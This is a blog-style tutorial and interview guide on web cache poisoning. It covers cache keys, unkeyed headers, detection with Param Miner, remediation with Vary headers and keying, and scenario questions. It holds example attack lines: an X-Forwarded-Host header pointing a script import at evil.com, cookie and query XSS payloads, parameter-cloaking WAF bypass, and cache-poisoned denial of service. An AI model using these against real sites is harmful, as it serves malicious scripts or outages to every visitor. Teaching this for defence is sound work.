---
layout: default
title: "Web Cache Poisoning: The Theory & Mechanics (Part 1)"
date: 2025-12-06
categories: [Web Security, Theory, Caching]
toc: true
---

# Web Cache Poisoning: Understanding the Mechanics

Web Cache Poisoning is a fascinating vulnerability that turns a performance optimization into a weapon. Unlike typical client-side attacks (like XSS) where you must trick a victim into clicking a link, cache poisoning allows you to "store" your attack on the server itself. Once the cache is poisoned, the server delivers your exploit to anyone who visits the page—no interaction required.

---

## 🔸 1. What is Web Caching?

To speed up load times and reduce server strain, modern web architectures use **Caching Servers** (like Varnish, Nginx, or CDNs such as Cloudflare and Akamai). These servers sit between the user and the backend application.

* **First Request:** When a user requests `homepage.html`, the cache checks if it has a copy. If not (a "Cache Miss"), it forwards the request to the backend, saves the response, and sends it to the user.
* **Subsequent Requests:** When the next user asks for `homepage.html`, the cache serves the saved copy directly (a "Cache Hit") without bothering the backend.

### The Cache Key

How does the cache know if two requests are for the "same" resource? It uses a **Cache Key**.

Typically, the Cache Key consists of:
1.  The **Request Line** (e.g., `GET /index.html`)
2.  The **Host Header** (e.g., `Host: example.com`)

Crucially, **everything else is ignored**. Headers like `User-Agent`, `Cookie`, or `X-Forwarded-For` are usually NOT part of the key. These are called **Unkeyed Inputs**.

---

## 🧨 2. The Vulnerability: Unkeyed Inputs

The vulnerability arises when the backend application **uses an Unkeyed Input** to generate the response, but the cache **does not include that input** in the Cache Key.

### The Discrepancy
**The Cache thinks:** "Requests A and B are identical because they have the same URL and Host header."
**The Application thinks:** "Request B has a special header, so I will generate a different response."

If an attacker sends a malicious Unkeyed Input (Request B), the application generates a poisoned response. The cache, seeing the standard URL, saves this poisoned response. Now, when a legitimate user sends a normal request (Request A), the cache serves them the poisoned copy because it thinks it matches.

---

## 🧠 3. How does it work? (The Mechanics)

The attack lifecycle follows a three-step process: **Poison, Cache, Distribute**.

1.  **Poison:** The attacker identifies an **Unkeyed Input** (like `X-Forwarded-Host`) that is reflected in the response. They send a request with a malicious payload in that header.
    Request:* `GET /` with `X-Forwarded-Host: evil.com`
    Response:* Contains `<script src="//evil.com/malicious.js">`

2.  **Cache:** If the server caches this response, the "poisoned" version is stored against the cache key for the homepage (`GET /`).

3.  **Distribute:** When a legitimate victim visits `GET /` (without the malicious header), the cache sees a match for the homepage and serves the stored response containing the attacker's script.

---

## 🧠 3. How to Start: The Methodology 
When approaching an application, you don't just "guess." You follow a strict process to find these discrepancies. 
### Step 1: 

Identify Unkeyed Inputs (What to Look For) 
You need to find an input that **changes the response** but **does not change the cache key**. 
1. **Manual Testing:** Use "Cache Busters" (e.g., `?cb=123`) to force a fresh response from the server so you can see if your input has an effect. 

2. **Automated Testing:** Use the **Param Miner** extension in Burp Suite. It automatically guesses thousands of headers (like `X-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) to see if any of them flip the response. 

### Step 2: Elicit a Harmful Response 

Once you find an unkeyed input (e.g., `X-Forwarded-Host`), you need to see how the application uses it. 
1. **Reflection:** Does it appear in the HTML? (e.g., `<meta property="og:url" content="...">`) 
2. **Script Imports:** Does it change a `<script src="...">` tag?
3. **Redirects:** Does it change the `Location` header in a 302 response? 

### Step 3: Poison the Cache Once you have a working payload: 
1. Remove your cache buster (target the real page). 
2. Send your malicious request. 
3. Check if you get `X-Cache: hit`. 
4. Test with a clean request (incognito browser) to see if you get served the poisoned page.

---

## 🧩 4. Root Causes: Why does it happen?

The vulnerability typically exists due to one of two failures:

### A. Configuration Mistake
There is a discrepancy between what the Cache considers part of the key and what the Application uses to build the response. For example, the application might rely on `X-Forwarded-Scheme` to determine if it should redirect users, but the cache ignores that header.

### B. Component Confusion
The Cache and the Application parse requests differently. For instance, the cache might see two parameters (`val` and `val`) and use the first one, while the application uses the second one. This is known as **Parameter Cloaking** or **Parameter Pollution**.

---

## 📍 5. Where does it behave dangerously? (Attack Surface)

Web Cache Poisoning is dangerous whenever unkeyed inputs control the output:

| **Unkeyed Input** | **Dangerous Behavior** | **Impact** |
| :--- | :--- | :--- |
| **Headers** (`X-Forwarded-Host`) | Controls script imports or base tags. | **Stored XSS** |
| **Headers** (`X-Forwarded-Scheme`) | Controls redirects (302 Location). | **Redirect Hijacking** |
| **Cookies** | Reflected in the DOM or JSON. | **XSS / Data Exfiltration** |
| **Query Parameters** (Excluded) | Reflected in the page. | **Content Spoofing / XSS** |

---

## 🛠️ 6. Detection & Exploitation Strategy

Finding these vulnerabilities requires a methodical approach. You are looking for a hidden input that changes the response *without* changing the cache key.

### 1️⃣ Detection: Find the Unkeyed Input
* **Manual Testing:** Use "Cache Busters" (e.g., `?cb=123`) to force a fresh response from the server so you can see if your input has an effect.
* **Automated Testing:** Use the **Param Miner** extension in Burp Suite. It automatically guesses thousands of headers and parameters to see if any of them change the response.

### 2️⃣ Verification: Confirm It's Unkeyed
Once you find an input that reflects (e.g., `X-Forwarded-Host`), remove the cache buster and test against the main cache entry.
Send the malicious request.
Send a normal request.
If the normal request returns the malicious response, you have confirmed the input is unkeyed and the cache is poisonable.

### 3️⃣ Exploitation: Construct the Payload
Depending on the reflection context, craft your exploit:
*XSS:** `<script>alert(1)</script>`
*Import Poisoning:** Pointing a `<script src>` to your Exploit Server.
*DoS:** Forcing the page to return a 404 or 500 error that gets cached.

---

## 🛡️ 7. Remediation & Defense Strategies

Defense against cache poisoning focuses on aligning the cache configuration with the application logic.

### 1️⃣ Disable Unkeyed Inputs
The safest fix is to configure the backend application to completely ignore headers that are not essential. If the app doesn't use `X-Forwarded-Host`, it cannot be exploited.

### 2️⃣ Key the Input
If the application *must* use a specific header (like `Region` or `Language`), you must configure the cache to include that header in the Cache Key. This ensures that a request with `Region: Evil` is stored separately from `Region: US`.

### 3️⃣ Use the "Vary" Header
The `Vary` header instructs the cache to treat the response as unique based on the value of specified headers. For example, `Vary: User-Agent` tells the cache to store different versions of the page for different browsers.

---

## ❓ 8. Interview Corner: Common FAQs

If you are interviewing for an AppSec role, Web Cache Poisoning is a strong topic to demonstrate deep protocol knowledge.

### Q1: What is the difference between Web Cache Poisoning and Web Cache Deception?
**Answer:**
*Cache Poisoning:** The attacker injects a malicious payload into the cache. *All* users who visit the page get infected (Integrity/Availability impact).
*Cache Deception:** The attacker tricks a logged-in victim into visiting a URL that the cache mistakenly stores. The attacker can then access that cached page to steal the victim's private data (Confidentiality impact).

### Q2: What is a "Cache Buster"?
**Answer:** A Cache Buster is a unique parameter added to a request (like `?cb=1234`) to force the cache to treat it as a new resource. This ensures the request is forwarded to the backend server (Cache Miss), allowing the tester to analyze the fresh response without interference from previously stored cache entries.

### Q3: How does the "Vary" header affect cache poisoning?
**Answer:** The `Vary` header restricts the blast radius of an attack. If the response contains `Vary: User-Agent`, and I poison the cache using Chrome, only other Chrome users will receive the poisoned response. Firefox users will get a separate cache entry. This makes the attack harder to execute broadly but still possible if I can target specific user agents.

### Q4: Why is Param Miner useful for this vulnerability?
**Answer:** Param Miner is essential because it automates the discovery of "hidden" unkeyed inputs. It guesses thousands of headers and parameters that are not visible in standard traffic to see if the backend processes them. Manual discovery of obscure headers like `X-Host` or `X-Forwarded-Scheme` is extremely time-consuming and error-prone.

---
### 🧠 Advanced Interview Questions (Continued)

#### Q5: What is CPDoS (Cache Poisoned Denial of Service)?

**Answer:** CPDoS stands for "Cache Poisoned Denial of Service." Instead of injecting XSS, the attacker forces the application to return an error response (like a 400 Bad Request or 500 Internal Error) by sending a malformed header. If the cache stores this error page, legitimate users requesting the homepage will be served the cached error instead of the actual content, effectively taking the site offline.

#### Q6: I found an unkeyed header that reflects input, but I cannot execute XSS. Is this still a vulnerability?

**Answer:** Yes, it can still be a **Content Spoofing** or **Phishing** vector. If I can poison the cache to display "System Maintenance: Call 555-0199 for support" on the login page, I can trick users. Additionally, if the header controls a redirect (e.g., `Location: ...`), I might be able to hijack the user's navigation or steal sensitive tokens via the URL.

#### Q7: Why is "Fat GET" poisoning effective against some frameworks?

**Answer:** A "Fat GET" is a GET request that includes a body.

**The Flaw:** Most caches ignore the body of a GET request and key only on the URL. However, some application frameworks (like Ruby on Rails or certain Java setups) parse the body even for GET requests.
  
**The Attack:** I can put a benign parameter in the URL (to satisfy the cache key) and a malicious parameter in the body (to poison the application response). The cache sees the "safe" URL and stores the "poisoned" outcome.
 

#### Q8: How does "Parameter Cloaking" work in cache poisoning?

**Answer:** Parameter Cloaking exploits parsing discrepancies between the cache and the backend. For example, if the cache interprets `;` as a parameter separator but the backend ignores it, I can inject a payload like `?example=1;utm_content=payload`. The cache might see `utm_content` (excluded from key) and ignore the payload, while the backend processes it, allowing me to slip malicious data past the cache key logic.

---

## 🎭 9. Scenario-Based Questions (The "Bar Raiser")

These scenarios test your ability to apply theory to complex, real-world situations.

### 🎭 Scenario 1: The "Harmless" Cookie

**Context:** You are testing a multi-lingual website. You notice a cookie `lang=en` that is reflected in the HTML tag: `<html lang="en">`. The developer argues this is not a security risk because the cookie is just a preference and isn't used for authentication. 

**The Question:** How do you prove this is a high-severity Web Cache Poisoning vulnerability? 

**Answer:** "I would check if the `lang` cookie is **unkeyed**. If the cache serves the same response regardless of the cookie value, I can send a request with `Cookie: lang="><script>alert(1)</script>`. If the backend reflects this unencoded, and the cache stores it, I have achieved **Stored XSS**. Any user who visits the site—regardless of their own cookies—will be served my poisoned response containing the XSS payload".

---

### 🎭 Scenario 2: The "Vary" Constraint

**Context:** You successfully poisoned the cache using a malicious `X-Host` header. However, when you send the link to your colleague, the exploit doesn't fire for them. You check the headers and see `Vary: User-Agent`.

**The Question:** Why did the exploit fail, and how do you fix it to target the victim? 

**Answer:** "The `Vary: User-Agent` header tells the cache to store separate copies of the page for every unique browser (User-Agent). My colleague likely has a different browser version than I do. To attack them, I need to **User-Agent Spoofing**. I must find out their exact User-Agent string (perhaps via an image pixel logger), and then re-poison the cache using _that specific_ User-Agent string so the cache serves the exploit to them".

---

### 🎭 Scenario 3: The "Unexploitable" Redirect

**Context:** You found that `X-Forwarded-Host: evil.com` triggers a 302 Redirect to `https://evil.com/login`. You cannot get XSS because the body is empty. The client says, "It's just an open redirect, low severity." 

**The Question:** How do you escalate this to Critical? 

**Answer:** "I would look for **JavaScript imports** or legitimate files that rely on this redirect. If the site loads a script like `<script src="/resources/js/main.js">`, and the server redirects that specific request to `evil.com/resources/js/main.js`, I can host a malicious `main.js` on my server. By poisoning the cache for that _resource_, I can execute arbitrary code in the browser of every user who visits the site, turning an 'open redirect' into full-blown **DOM-based XSS**".

---

### 🎭 Scenario 4: The Cloaked Parameter

**Context:** The application excludes `utm_content` from the cache key. However, the WAF blocks any request containing `alert()` or `<script>` inside `utm_content`. 

**The Question:** You notice the site creates a JSONP endpoint `/api/geo?callback=load`. How can you use **Parameter Cloaking** to bypass the WAF and poison the cache? 

**Answer:** "I would try to hide the malicious callback inside the unkeyed parameter using a separator the cache ignores but the app respects (like `;` or `&`).

1. **Payload:** `/api/geo?callback=load&utm_content=junk;callback=alert(1)`
  
2. **Logic:** The WAF/Cache sees `utm_content` as one large blob and ignores it (unkeyed). The backend parses the `;` and sees a second `callback` parameter, which overrides the first one. This allows the payload to reach the backend processing logic while hiding from the cache key validation".
    
---

### 🎭 Scenario 5: The "DOS" Accident

**Context:** During a pentest, you fuzz the `X-Forwarded-Port` header with non-numeric values (`abcd`). Suddenly, the website stops loading for everyone, returning a "500 Internal Server Error." 

**The Question:** What happened, and how do you fix it immediately? 

**Answer:** "I triggered a **CPDoS (Cache Poisoned Denial of Service)**. The backend application crashed when trying to parse the invalid port 'abcd', and the cache unfortunately stored that 500 Error response. Now, every legitimate user is being served that cached error. 

**To fix it:** I need to send a fresh, valid request with a **Cache Buster** (like `?cb=9999`) to confirm the site is up. To fix it for everyone else, I must wait for the cache TTL (Time To Live) to expire, or contact the admin to manually purge the cache key for the homepage".

---

## 🛑 Summary of Part 1
1. **Concept:** Caches store responses to speed up traffic based on a Cache Key.
2. **Flaw:** Unkeyed inputs (ignored by the cache key) can alter the backend response.
3. **Attack:** We inject a malicious payload via an unkeyed input. The cache stores it and serves it to legitimate users.
